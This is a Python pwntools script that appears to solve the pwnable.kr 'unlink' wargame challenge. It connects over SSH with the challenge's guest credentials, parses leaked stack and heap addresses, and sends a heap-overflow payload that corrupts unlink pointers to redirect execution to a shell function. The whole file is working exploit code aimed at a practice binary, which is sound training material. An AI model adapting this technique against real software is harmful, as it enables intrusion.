from pwn import *

context.log_level = 'debug'
con = ssh(host='pwnable.kr', user='unlink', password='guest', port = 2222)
p = con.process("/home/unlink/unlink")
shell_addr = 0x080484F4

content = p.recv()
stacker = int(content.split("\n")[0].split(" ")[-1], 16)
heap = int(content.split("\n")[1].split(" ")[-1], 16)
target  = stacker + 0x14 - 0x4
print hex(target)
print hex(heap)

payload = 'A' * 8 + 'a' * 8
payload += p32(target - 0x4) + p32(heap + 0x40) + 'a' * 28   + p32(shell_addr)
raw_input()
p.sendline(payload)
p.interactive()
